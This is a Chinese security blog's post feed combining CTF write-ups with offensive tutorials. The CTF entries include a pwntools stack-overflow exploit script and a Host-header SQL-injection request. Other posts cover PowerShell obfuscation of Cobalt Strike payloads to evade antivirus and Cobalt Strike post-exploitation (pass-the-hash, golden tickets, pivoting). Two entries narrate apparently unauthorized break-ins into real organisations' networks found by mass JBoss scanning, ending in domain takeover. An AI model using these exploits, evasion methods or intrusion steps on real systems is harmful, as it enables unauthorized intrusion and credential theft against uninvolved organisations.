依次验证，满足条件即返回1，则通过校验。 详细看看第8-13行，4个未知数和四个方程，emmm。 1234dword_6020A4 *s - dword_6020AC * dword_6020A8 == 26520428329201731423 * dword_6020A8 + 4 * dword_6020AC - dword_6020A4 - 2 * s == 3979589183 * s * dword_6020AC - dword_6020A8 * dword_6020A4 == 334569238037671507027 * dword_6020A4 + s - 11 * dword_6020AC - dword_6020A8 == 40179413815 利用python的z3库 123456789101112131415161718#/usr/bin/env python# coding=utf-8from z3 import *dword_6020A4 = Int(&apos;dword_6020A4&apos;)dword_6020AC = Int(&apos;dword_6020AC&apos;)dword_6020A8 = Int(&apos;dword_6020A8&apos;)s = Int(&apos;s&apos;)solve(dword_6020A4 * s - dword_6020AC * dword_6020A8 == 2652042832920173142 , 3 * dword_6020A8 + 4 * dword_6020AC - dword_6020A4 - 2 * s == 397958918 , 3 * s * dword_6020AC - dword_6020A8 * dword_6020A4 == 3345692380376715070 , 27 * dword_6020A4 + s - 11 * dword_6020AC - dword_6020A8 == 40179413815 )运算结果：s = 1869639009dword_6020A4 = 1801073242dword_6020A8 = 829124174dword_6020AC = 862734414 接下来到异或运算，直接用C语言吧 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include&lt;stdlib.h&gt;int v1,v2,v7,v8,v9,v10,v11,v12;int main(void) &#123; srand(829124174 ^ 1801073242 ^ 1869639009 ^ 862734414); v1 = rand() % 50; v2 = rand() % 50; v7 = rand() % 50; v8 = rand() % 50; v9 = rand() % 50; v10 = rand() % 50; v11 = rand() % 50; v12 = rand() % 50; printf(&quot; v1=%d \n v2=%d \n V7=%d \n v8=%d \n v9=%d \n v10=%d \n v11=%d \n v12=%d&quot;,v1,v2,v7,v8,v9,v10,v11,v12); return 0;&#125;运算结果：v1=22 v2=39 V7=45 v8=45 v9=35 v10=41 v11=13 v12=36 然后继续接下来的方程 123456789101112131415161718#/usr/bin/env python# coding=utf-8from z3 import *v3 = Int(&apos;v3&apos;)v4 = Int(&apos;v4&apos;)v5 = Int(&apos;v5&apos;)v6 = Int(&apos;v6&apos;)solve(v6 * 39 + v3 * 22 - v4 - v5 == 61799700179,v6 + v3 + v5 * 45 - v4 * 45 == 48753725643,v3 * 35 + v4 * 41 - v5 - v6 == 59322698861,v5 * 36 + v3 - v4 - v6 * 13 == 51664230587,)运算结果：v3 = 811816014v4 = 828593230v5 = 1867395930v6 = 1195788129 将数字串转换成字符串。 1234567891011#/usr/bin/env python# coding=utf-8import libnumflag = &quot;&quot;x = [1869639009,1801073242,829124174,862734414,811816014,828593230,1867395930,1195788129]for y in x: flag += libnum.n2s(y)[::-1] print flag运算结果：ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG 得出正确的输入值，输入输出 0x04 PWNLogin题目：nc 47.104.16.75 9000 程序地址：Pwn-Login 下载附件倒入IDA进行分析 程序运行过程： 1main()--&gt;Login()--&gt;Menu()--&gt;ExecCmd()--&gt;ShowUserlist()... 查看Login()内容，总的看没什么特别的，接下来看Menu() 12345678910111213141516171819202122232425262728293031&#123; __int64 result; // rax@6 char buf[68]; // [sp+0h] [bp-50h]@1 int v2; // [sp+44h] [bp-Ch]@2 __int64 v3; // [sp+48h] [bp-8h]@1 memset(buf, 0, 0x40uLL); v3 = 0LL; do &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;\nPanel\n\n1. exec command\n2. show user list\n3. exit\n&quot;); printf(&quot;Your choice: &quot;); fflush(_bss_start); v2 = read(0, buf, 0x280uLL); buf[v2] = 0; if ( buf[0] != 49 ) break; ExecCmd(); &#125; if ( buf[0] != 50 ) break; ShowUserlist(0LL, buf); &#125; result = (unsigned __int8)buf[0]; &#125; while ( buf[0] != 51 ); return result; 注意看第18行的代码。非常简单，单纯的读取一串字符串，然后储存在buf里面，但是，开辟的缓存区只有0x50字节大小，但是read最多可以读取0x280字节大小，这样就会造成缓存区溢出，也就是栈溢出漏洞。 接下来再看ExecCmd() 123456789101112131415161718192021int ExecCmd()&#123; int result; // eax@2 char *v1; // [sp+0h] [bp-10h]@3 if ( !strcmp(strUsername, &quot;admin&quot;) ) //判断是否为admin用户 &#123; printf(&quot;Command: &quot;, &quot;admin&quot;, 0LL); fflush(_bss_start); fgets(cmd, 255, stdin); v1 = strchr(cmd, 10); if ( v1 ) *v1 = 0; result = puts(&quot;Sorry, this feature has been disabled.&quot;); &#125; else &#123; result = puts(&quot;Sorry, this feature is only available for admin&quot;); &#125; return result;&#125; 我们要做的：如下图，程序不经过红框内，直接跳过输出。 也就是将return修改到call system，记住交互的最后还得输入一个3退出while循环 脚本： 123456789101112131415161718from pwn import * context.log_level = &apos;debug&apos;p = remote(&apos;47.104.16.75&apos;,9000)#p = process(&apos;./pwn50&apos;)p.recvuntil(&quot;:&quot;)p.sendline(&quot;admin&quot;) #Send usernamep.recvuntil(&quot;:&quot;)p.sendline(&quot;T6OBSh2i&quot;) #Send passwordp.recvuntil(&quot;: &quot;)p.sendline(&quot;1&quot;) #Choose 1. exec commandp.recvuntil(&quot;: &quot;)p.sendline(&quot;/bin/sh&quot;) #Send cmdp.recvuntil(&quot;: &quot;)p.sendline(&quot;\x90&quot;*0x58 + p64(0x40084A)) #Change return addressp.recvuntil(&quot;: &quot;)p.sendline(&quot;3&quot;)p.interactive() flag{welcome_to_iscc} Mobile小试牛刀附件地址：小试牛刀 拖进JEB2，查看Manifest、action等基础信息。这道题的坑就是壳的问题。 后来发现，Assets中的bfsprotect.jar就是源码。 右键MainActivity选择Decompile查看源码，一览无遗。 在onCreate()中发现了下面这个判断，与APP页面的判断显示一致。 12345678public void onClick(View arg5) &#123; if(!new ProtectClass().protectMethod(MainActivity.this.editText.getText().toString())) &#123; Toast.makeText(MainActivity.this, &quot;Wrong Flag&quot;, 0).show(); &#125; else &#123; Toast.makeText(MainActivity.this, &quot;Correct Flag&quot;, 0).show(); &#125; &#125; 进入ProtectClass()查看，就能看到对比的值，也就是flag值 1234567public boolean protectMethod(String arg4) &#123; int v1; for(v1 = 0; v1 &lt; MainActivity.runTimes &gt;&gt; 1; ++v1) &#123; &#125; return arg4.equals(&quot;BFS-ISCC&quot;);&#125; 或者，打开bfsprotect.jar，直接搜索iscc即可得到flag]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C段ping操作（C#入门）]]></title>
    <url>%2F2018%2F04%2FC%E6%AE%B5ping%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[利用周末，造个轮子，学习C#！！ 官方examples查看官方的Ping类，已经很成熟了。以下为官方examples 1234567891011121314151617181920212223public static void Main (string[] args) &#123; Ping pingSender = new Ping (); PingOptions options = new PingOptions (); // Use the default Ttl value which is 128, // but change the fragmentation behavior. options.DontFragment = true; // Create a buffer of 32 bytes of data to be transmitted. string data = &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;; byte[] buffer = Encoding.ASCII.GetBytes (data); int timeout = 120; PingReply reply = pingSender.Send (args[0], timeout, buffer, options); if (reply.Status == IPStatus.Success) &#123; Console.WriteLine (&quot;Address: &#123;0&#125;&quot;, reply.Address.ToString ()); Console.WriteLine (&quot;RoundTrip time: &#123;0&#125;&quot;, reply.RoundtripTime); Console.WriteLine (&quot;Time to live: &#123;0&#125;&quot;, reply.Options.Ttl); Console.WriteLine (&quot;Don&apos;t fragment: &#123;0&#125;&quot;, reply.Options.DontFragment); Console.WriteLine (&quot;Buffer size: &#123;0&#125;&quot;, reply.Buffer.Length); &#125; &#125; 运行结果： 修改数据显示官方demo中使用的是默认的Ttl（128），那接下来也使用这个默认值。对demo进行修改，显示所需要的信息即可。 123Console.WriteLine (&quot;Address: &#123;0&#125;&quot;, reply.Address.ToString ());Console.WriteLine (&quot;HostName: &#123;0&#125;&quot;, Dns.GetHostEntry(reply.Address.ToString()).HostName);Console.WriteLine (&quot;Time to live: &#123;0&#125;&quot;, reply.Options.Ttl); 这只能识别windows系统的，毕竟是128。emmm。 正则匹配IP使用正则去匹配输入的IP地址是否合理。 123456// IP地址Regex regex = new Regex(@&quot;\d+\.\d+\.\d+\.\d+&quot;);// (提取IP地址时有用)// IP地址Regex regex = new Regex(@&quot;((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))&quot;);// IP地址...... 调用处理： 效果： demo流程：输入–&gt; 判断IP格式（处理）–&gt;遍历（ToString）–&gt;Ping()–&gt;输出–&gt;结束 项目地址： 【参考】 https://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping(v=vs.110).aspx]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【免杀】PowerShell免杀（一）]]></title>
    <url>%2F2018%2F04%2F%E3%80%90%E5%85%8D%E6%9D%80%E3%80%91PowerShell%E5%85%8D%E6%9D%80%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[最近在看免杀 0x00 代码块可以使用PowerShell的一个语言特性做通用免杀，那就是代码块（即ScriptBlock）。 代码块是一段可以被执行的PowerShell代码，通常是把代码块直接放在闭合的大括号中，类似函数function，带上代码块更加灵活，可以作为函数参数传递，也可以动态生成和调用。若想在PowerShell中动态创建代码块，首先得知道如何将一段字符串换成代码块对象。1$scriptblock = [SriptBlock]::Create('notepad') 先是字符串，然后转换成代码块对象，当然这个字符串也可以是变量。 调用方法：12345Invoke-Command $scriptblock或者可以直接Invoke-Command -ScriptBlock ([ScriptBlock]::Create('notepad'))代码块操作操作符(&amp;)&amp;$scriptblock 0x01 加解密先对家吗进行加密，再加密执行 说到加密，最先想到的就是base64的编码加密了，既然容易想到，那就容易被杀。实现：1234567891011121314$str = "RcoIl"# $str = [System.IO.File]::ReadAllText("C:\Users\allen\Desktop\payload.ps1");$bytes = [System.Text.Encoding]::Ascii.GetBytes($str) # 编码方式变一下也无所谓$encode = [Convert]::ToBase64String($bytes) # 加密$encode.Substring(0)$decode =[Convert]::FromBase64String($encode); #解密$byte = [System.Text.Encoding]::Ascii.GetString($decode)$byte.Substring(0)运行结果：PS C:\Users\allen\Desktop&gt; .\demo.ps1UmNvSWw=RcoIl 加上异或12345678910111213141516171819$str = "RcoIl"$bytes = [System.Text.Encoding]::Ascii.GetBytes($str)for($i=0; $i -lt $bytes.count; $i++) &#123; $bytes[$i] = $bytes[$i] -bxor 0x98 # 异或&#125;$encode = [Convert]::ToBase64String($bytes) # 加密$encode.Substring(0)$decode =[Convert]::FromBase64String($encode); #解密for($i=0; $i -lt $decode.count; $i++) &#123; $decode[$i] = $decode[$i] -bxor 0x98 # 异或&#125;$byte = [System.Text.Encoding]::Ascii.GetString($decode)$byte.Substring(0)运行结果：PS C:\Users\allen\Desktop&gt; .\demo.ps1ypj7mPeY0Zj0mA==RcoIl 0x02 免杀效果payload选择的是Cobalt Strike 3.8生成的payload.ps1编译生成exe.当然，在实际测试过程中并没有那么完美，至少没能绕过avp的行为查杀。 【参考】 https://www.peew.pw/blog/2017/12/4/writing-net-executables-for-penteters-part-2]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cobalt Strike上手学习]]></title>
    <url>%2F2018%2F04%2FCobalt%20Strike%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[Cobalt Strike是一款非常优秀的后渗透平台，基于Java。 日常的Cobalt Strike学习，Cobalt Strike提供的UI界面，使得很多操作都很容易理解，所以使得很多操作变得更加的简单。 监听器beacon 123是Cobalt Strike内嵌的监听器，也就是说，当在目标系统成功执行payload后，会弹会一个beacon的shell给Cobalt Strike，该shell所支持的通信协议主要包括dns、https、http、smp[pipe]。 实战中尽可能使用dns，或者，不用IP而使用域名。 foreign 123提供给外部使用的一些监听器，比如你想利用Cobalt Strike派生一个Meterpreter的shell进行内网渗透，这就需要用到foreign。 使用powershell第一种方式：在beacon shell中导入外部ps脚本到远程机器上 12powershell-import /root/Desktop/PowerView.ps1powershell Get-NetGroup -GroupName *admin* 第二种方式：在beacon shell中直接执行powershell代码 1powerpick Get-NetGroup socks为了让CS和msf互相间联通使用，在目标机器上开启socks4a代理。 [Beacon]–&gt;[Pivoting]–&gt;[SOCKS Server] 或者直接在beacon中执行socks post 第一种利用方式：利用各种socks代理客户端直接把各类渗透工具带进目标进网 123# vi /etc/proxychains.conf socks4 lhost 2333# proxychains msfconsole 第二种利用方式：直接利用隧道把整个msf带进目标内网 12# msfconsolesetg Proxies socks4:lhost:2333 SSH登陆 使用upload和download进行上传下载。也可以通过socks代理进行登陆。 权限提升[Beacon]–&gt;[access]–&gt;[Elevate] Cobalt Strike 内嵌了两个提权exp，ms14-058是个老提权漏洞利用方式，可利用于Windows 7系统。 uac-dll是一种Bypass UAC攻击，是由本地管理员运行payload从中等权限往最高权限提升的过程，适用于windows 7和windows 10。 可以通过导入cna文件进行丰富漏洞库。项目地址为：ElevateKit Spawn可使用spawn功能孵化出n个shell，shell与shell之间相当于以一种级联的形式存在。 作用：将公网某团队服务器的beacon shell 派生到本地团队服务器指定的监听器上，或是派生到msf。 派生至本地团队服务器 建立好监听器，返回到左边的公网团队服务器使用spawn功能，选择刚刚建立的监听器。 过一会儿就能看到shell被正常弹到本地团队服务器指定的监听器上。 派生至Meterpreter 在公网团队服务器上创建一个外部foreign监听器（本地msf与CS使用的协议无比相同） 横向移动 首先，要决定用哪种方法来横向移动（当前环境需要高度完整的管理员权限才能完成正常操作）。 如果想使用token作用于某个Beacon，那就选中当前会话的Token框， 如果想使用证书或哈希来横向移动，就从凭证存储库中选择凭据或填充用户、密码和域等字段，Beacon会将此信息作为需要的令牌。 选择用于横向移动的Listener，通常这个会选择使用HTTPS。 最后选择Session，这选项只需要选择同个内网机器Session即可（已上线）。 PS： Cobalt Strike的异步进攻模式要求每一次攻击都是以当前一个受损系统（已控）为跳板执行的。如果存在多台已控机器，则优先考虑Windows系统作为跳板机，且利用所有的凭证或哈希，攻击成功则会反馈在Beacon控制台中。 查看官方操作，与日常操作方式不太一样。 转发通过红色区域（指已获取beacon shell的机器）做一个重定向到蓝色区域（没有取得控制权的目标机器）有漏洞的机器。 查看说明 1234567beacon&gt; help rportfwdUse: rportfwd [bind port] [forward host] [forward port] rportfwd stop [bind port]Binds the specified port on the target host. When a connection comes in,Cobalt Strike will make a connection to the forwarded host/port and use Beaconto relay traffic between the two connections. 第一个参数为监听端口，第二个参数是转发主机和转发端口。注意：目标主机都会有防火墙拦截链接（弹框提示）。 becon shell 内置了端口转发功能，把本机的某个端口转发到公网（如3389）。 [Beacon]–&gt;[Pivoting]–&gt;[Listener] 接下来正常链接x.35这台的2333端口即可。 内网机器 在Beacon shell中建立一条新的监听规则。 12345beacon&gt; shell netstat -ano | findstr &quot;7878&quot;[*] Tasked beacon to run: netstat -ano | findstr &quot;7878&quot;[+] host called home, sent: 37 bytes[+] received output: TCP 0.0.0.0:7878 0.0.0.0:0 LISTENING 3516 在Cobalt Strike当中新建一个Listener，内容如图所示： 上线的Listener选择新建的rportfwd-listener即可。 黄金票据使用域管理员权限伪造一张黄金票据是最常见的方法。 制作黄金票据的前提条件： 想要伪造票据的用户 为其创建票据的域名 域的SID（whomai /user） 域控制器上krbtgt用户的NTLM哈希值 PS： 首先要使用klist /purge清除缓存的授权票据。 Malleable-C2自从Cobalt Strike更新至3.6版本后，官方给出了一个Malleable-C2，也就是在启动团队服务器（服务端）的时候加载一些配置文件，这是一个非常棒的功能，可以帮助我们伪装流量、SSL加密通讯，达到隐匿的效果，值得一用。 123cd /opt/cobaltstrike/git clone https://github.com/rsmudge/Malleable-C2-Profiles# 使用方法：./teamserver [external IP] [password] [/path/to/my.profile] 参考：Cobalt Strike-help]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JBoss引起的内网渗透-3]]></title>
    <url>%2F2018%2F03%2FJBoss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-3%2F</url>
    <content type="text"><![CDATA[待人如知己！！！ 首先说明，这个系列的JBoss都是批量获取的，并不是针对某地区某组织而为。 WebShell如同上一篇文章获取，但是这次是直接上传jsp脚本文件，这样更加快捷。 信息收集123456789本机用户信息： %computername% --&gt; SZXzzAO-RxxxSY ifconfig --&gt; 192.168.140.171 %os% --&gt; Windows Server 2008 R2 x64 System Model --&gt; VMware Virtual Platform Statistiques depuis --&gt; 19/03/2018 15:00:18域情况： 存在域使用循环ping找出了50+台C段存活主机 翻阅目录 从用户目录来看，发现域管登录的痕迹； C盘根目录下有metasploit，创建时间为2016-04-19； 用户support用于黑客行为操作用户（CrackMapExec扫描日志等）； 在deploy\management存在大量后门文件； 在$Recycle.Bin存在已删除的恶意exe可执行文件； 存在Panda Security（熊猫卫士）文件夹 后门之多无法想象。 进程收集 存在PSANHost.exe（熊猫卫士） 大量的cmd.exe、powershell.exe及taskkill.exe 其他 screenshot –&gt; 锁屏 问题处理问题 上传的远控可执行文件运行无反应； 执行Desktop下的mimikatz.exe，一执行就消失（杀软？）； 使用powershell执行mimikatz获取hash，但密码为空（注册表被篡改了？）； 无法将自添加的用户加入管理员组； 无法执行net view等命令（net 系列缺失）。 分析 生成的马是免杀的（virustotal.com）； Panda动态查杀mimikatz； 存在KB2871997补丁（Administrator-500）； 执行命令无回显估计是因为地区语言的原因。 突破方法 生成新的CS马； 修改注册表； 使用PsExec进行hash注入； 对内网使用MS-17-010； 对内网的Web服务进行渗透。 横向拓展前奏反弹个metasploit的shell，利用smb进行主机识别。但是失败，估计是在添加路由的时候出现错误，导致访问不到它的内网段。 已知条件： 远控上线； SZXzzAO-RxxxSY各用户的hash。 定位想要横向，那就得需要知道域控为哪些，域管为哪些，域用户为哪些，内网机器存活为多少。这就关于到内网渗透定位技术问题。 常规的命令： 1234567net user /domain # 存在数据net view /domain # 该列表是空的net group /domain # 存在数据net group &quot;domain admins&quot; /domain # 无法找到组名称net time /domain # 存在数据net group &quot;domain controllers&quot; /domain # 无法找到组名称nltest /dclist:ALxxx.lxxxl # 存在数据 以下内容是以上信息的综合： 123域控： SZXDC01 --&gt; 192.168.140.10 SZXDC02 --&gt; 192.168.140.11 使用Cobalt Strike的ARP扫描（因为net view使用不了），使得Targets有记录。 接下来就是找域管理员，既然不知道组名称，那就先找组名，过程参考内网渗透测试定位技术总结。 完成！ 方法用比较典型的hash注入碰一下看看运气怎么样。由于存在KB2871997补丁，所以只能使用administrator用户进行注入。 登陆情况如下： 12345678192.168.140.10 # 失败192.168.140.11 # 失败192.168.140.14 # 成功....192.168.140.57 # 成功192.168.140.78 # 失败192.168.140.160 # 成功.... 这个过程就是不断的进行hash注入，不断的dump密码，结果就如上图。看Credentials里是否存在域管用户账密。 成功获取到域管的账号密码。进行登陆。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JBoss引起的内网渗透-2]]></title>
    <url>%2F2018%2F03%2FJBoss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-2%2F</url>
    <content type="text"><![CDATA[待人如知己！！ 说明：本文中有个错误的概念验证，在判断域管理员的时候不能这么判断的，是不合理的。主要原因是在实操的时候，刚好能够使用Administrator用户密码登陆域，所以文章中就这么下结论了。这只是一个小概率事件，不成定律。 切入点Jboss的反序列化漏洞，接下来看站点信息 正常来说这个admin-console及web-console/都是能正常访问的，就算不能正常访问也不会是404状态 ，所以为了搞清楚原因，去翻了其目录，进行对比。发现 12server\default\deploy #默认部署war目录server\web\deploy # 部署war相对应的编译生成目录 两个目录中，在\web\deploy\中缺少了admin-console和web-console，所以原因是：管理员在安装了JBoss后，为了安全起见，就在server\web\deploy删除了admin-console.war和web-console.war，所以在部署目录下是存在war包，但是编译目录下是不存在的。 所以接下来就进行常规的war部署，发现war已经上传上去了，但是访问出现404，所以跑去server\web\deploy查看，发现是没有生成相对应的文件夹，原因暂时未知。 所以就直接将jsp脚本上传到了jmx-console.war当中，成功获取WebShell 12server\default\deploy\jmx-console.war\ # 上传访问失败server\web\deploy\jmx-console.war\ # 上传访问成功 信息收集接下来又是常规的信息收集 发现在菜刀里面执行命令，多数都是超时状态，所以还是回到之前的工具进行执行或是上传个命令执行马或是用web访问马。 进程里面是存在avguard.exe，所以需要做免杀。系统是windows xp-x86。 在查看环境变量的时候发现是存在powershell的,但是没起作用。 12345678910111213141516net user #查看本机用户-------------------------------------------------------------------------------Administrator Guest HelpAssistant postgres saverio SUPPORT_388945a0 net group &quot;domain admins&quot; /domain #查看域管理员-------------------------------------------------------------------------------Administrator bckagent dbagent faxmaker idsmessina lattuca SpaceGuardSvcAccnt trovato VMwareVDPBackupUser net group &quot;domain controllers&quot; /domain #查看域控制器-------------------------------------------------------------------------------DOMAIN1$ DOMAIN2$ 域用户就不列举了，实在有些多 信息收集到这里，就有些蹊跷，因为本机用户里面，除了Administrator存在于域用户中，其余的账户均不见，所以这里能直接判断Administrator就是域管理员。 综合以上信息： 1234DOMAIN2 - 192.168.20.10 # 域控制器PROTRIBUTCT -Administrator # 域管理员avguard.exe # 小红伞杀软powershell # 不可用 小小免杀续上次的shellter免杀，是过不了小红伞的，所以，这种时候，该储备的东西就起作用了。 生成一个Metasploit的马，去Virustotal做测试免杀，是过了AVG的，所以尝试一波。但是，生成的exe在windows 7下面是能正常执行的，但是到了xp上面就不行了。 用Veil生成个吧，安装Veil也是个大坑，图就不放了。 横向内网接下来思路就很明确了。将PROTRIBUTCT的密码dump下来，幸运的话整个域就能拿下来了。 至此，这个域已经拿下，比上篇难度相对来说要小一些。 还有一个点，就是在查看域控的时候发现是有两台的，也是一样的登陆方式进行登陆即可。但是在这两台域控执行net view /domain:xxxxx结果都是不一样的，这也许就是两台域控的缘故吧。但是DOMAIN1所在的段只能通过DOMAIN2出来，其他机器做跳板均没数据，或许这是玄学了吧。 至此，整个测试流程就结束了。整个过程有点顺利，不是我发blog的初衷。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[P牛的红包口令]]></title>
    <url>%2F2018%2F02%2FP%E7%89%9B%E7%9A%84%E7%BA%A2%E5%8C%85%E5%8F%A3%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[这个口令红包没领成。 新年新气象，逛圈子偶遇到P牛发的一个红包。 题目如下： 12018.mhz.pw:62231 信息获取使用浏览器访问题目，发现无法访问，且提示为ERR_INVALID_HTTP_RESPONSE，那就说明这个端口并不是HTTP协议的服务。 使用端口指纹识别： rsync是linux系统下的数据镜像备份工具。所以我们得去了解一下rsync的基本语法 12列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync://2018.mhz.pw:62231从远程rsync服务器中拷贝文件到本地机。如：rsync -av rsync://2018.mhz.pw:62231/www /databack 源码拉取 将git裸仓库进行还原 1git clone pwnhub_6670.git/ 需要审计的源码还原成功，但是本地搭建没成功，得修改修改（环境问题）。 漏洞挖掘文件列表如下： 初略看了下，只有一个登录框。 那还是读源码吧。从index.php 跳转至cpre.php，先看这份PHP代码。 从开始都是一些常规的全局设置。再往下看。 目标站点只有简单的登陆功能，相关代码如下： 123456789101112131415161718192021222324252627escape($_REQUEST); # 转义escape($_POST);escape($_GET);function escape(&amp;$arg) &#123; if(is_array($arg)) &#123; # 判断$arg是否为数组 foreach ($arg as &amp;$value) &#123; # 遍历$arg数组。每次循环中，当前单元的值被赋给$value并且数组内部的指针向前移一步。 escape($value); &#125; &#125; else &#123; $arg = str_replace([&quot;&apos;&quot;, &apos;\\&apos;, &apos;(&apos;, &apos;)&apos;], [&quot;‘&quot;, &apos;\\\\&apos;, &apos;（&apos;, &apos;）&apos;], $arg); # 将$arg内的单引号、小括号转换成中文符号，将反斜杠进行转义。 &#125;&#125;function arg($name, $default = null, $trim = false) &#123; if (isset($_REQUEST[$name])) &#123; # 检查$_REQUEST中是否存在$name值 $arg = $_REQUEST[$name]; &#125; elseif (isset($_SERVER[$name])) &#123; # 检查$_SERVER中是否存在$name值 $arg = $_SERVER[$name]; &#125; else &#123; $arg = $default; &#125; if($trim) &#123; $arg = trim($arg); &#125; return $arg;&#125; 在检测的$name值当中，$_SERVER很明显并没有被转义处理。或许我们能利用这一个点。 再往下看代码、来到了Controller类。分了BaseController.php和MainController.php，它们是继承关系。在MainController.php看到了三个函数。 123actionIndex() #主页actionLogin() #登陆 (正常验证)actionRegister() #注册 看到这里我才知道是有注册功能的。下面来看看actionRegister的代码： 123456789101112131415161718192021222324252627282930313233343536function actionRegister()&#123; if ($_POST) &#123; $username = arg(&apos;username&apos;); # 检查是否存在 $password = arg(&apos;password&apos;); if (empty($username) || empty($password)) &#123; # 判断用户密码是否为空 $this-&gt;error(&apos;Username or password is empty.&apos;); &#125; $email = arg(&apos;email&apos;); # 检查是否存在 if (empty($email)) &#123; # 如果email为空，则email由输入的用户名、@及HOST组合而成 $email = $username . &apos;@&apos; . arg(&apos;HTTP_HOST&apos;); &#125; if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123; # FILTER_VALIDATE_EMAIL过滤器 $this-&gt;error(&apos;Email error.&apos;); &#125; $user = new User(); # 判断用户名是否存在 $data = $user-&gt;query(&quot;SELECT * FROM `&#123;$user-&gt;table_name&#125;` WHERE `username` = &apos;&#123;$username&#125;&apos;&quot;); if ($data) &#123; $this-&gt;error(&apos;This username is exists.&apos;); &#125; $ret = $user-&gt;create([ # 向users表中插入数据 &apos;username&apos; =&gt; $username, &apos;password&apos; =&gt; md5($password), &apos;email&apos; =&gt; $email ]); if ($ret) &#123; $_SESSION[&apos;user_id&apos;] = $user-&gt;lastInsertId(); &#125; else &#123; $this-&gt;error(&apos;Unknown error.&apos;); &#125; &#125;&#125; 能利用的点就是email的组成元素(HTTP_HOST)，而HTTP_HOST又是由arg函数获取的，也就是说可以从没有被转义的$_SERVER着手。既然是数据库操作，那就看看是否能构造语句使之形成SQL注入漏洞。 先明确一点：Email由用户名、@、Host三者拼接而成，而Host可利用的点为$_SERVER。 但是其中有个FILTER_VALIDATE_EMAIL过滤器，所以首先还是得绕过这个过滤器。 绕过过滤器第一次见到FILTER_VALIDATE_EMAIL是在PHPMailer的CVE-2016-10033里面遇到的，当时还是用着wordpress博客程序。 这样就能引入了引号，又符合过滤器的规则。那我们就传入用户名为&quot;qqq，Host为rcoil&#39;&quot;@rcoil.me进行注册。因为邮箱中包含单引号，所以必会造成SQL注入。 构造SQL注入将Host进行修改，结果如下： 404错误，并不是我们想象中的情景。之前做CTF的时候有过这类型的情况，添加多一个Host就可以了。如图： 既然构成了SQL注入，那就看看怎么利用了。 SQL注入在源码中有分sql备份文件，从里面能看到SQL的结构。 最后卡在了这个报错注入里面。 P牛的WriteUP攻击LNMP架构Web应用的几个小Tricks 知识点还是掌握得不够，静下心来好好学习。 看了P牛的WriteUp，才注意到create方法就是拼接了一个INSERT语句，而且报错信息也没仔细看。 现在回过头来想想，确实就是这么一回事。在插入的过程中，闭合了前段语句，再新建一个语句插入自己定义的语句，就能在可控的范围内获取自己所需要的信息。翻了翻之前的笔记。 123456789101112131415161718192021222324252627282930313233mysql&gt; use test;Database changedmysql&gt; SELECT @@version;+-----------+| @@version |+-----------+| 5.5.53 |+-----------+1 row in setmysql&gt; select * from demo;+------+------+------+| demo | test | aoao |+------+------+------+| d | d | d |+------+------+------+1 row in setmysql&gt; INSERT into demo VALUES(&apos;A&apos;,&apos;A&apos;,&apos;A&apos;),(&apos;B&apos;,&apos;B&apos;,&apos;B&apos;);Query OK, 2 rows affectedRecords: 2 Duplicates: 0 Warnings: 0mysql&gt; select * from demo;+------+------+------+| demo | test | aoao |+------+------+------+| d | d | d || A | A | A || B | B | B |+------+------+------+4 rows in set 然后我们构造一下语句 1234567891011121314151617POST /main/register HTTP/1.1Host: 2018.mhz.pwHost: rcoil&apos;),(&apos;ao123&apos;,md5(121314),(select(flag)from(flags)))#&quot;@rcoil.meContent-Length: 34Cache-Control: max-age=0Origin: http://2018.mhz.pwUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://2018.mhz.pw/main/registerAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bvdrraji3mjirt5noljghm8ib7Connection: closeusername=&quot;qq&amp;email=&amp;password=aaaaa 闭合了前段的INSERT语句，并新建了一条语句，在email字段将flag读取。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编码转换工具 （C#入门）]]></title>
    <url>%2F2018%2F01%2F%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7%2F</url>
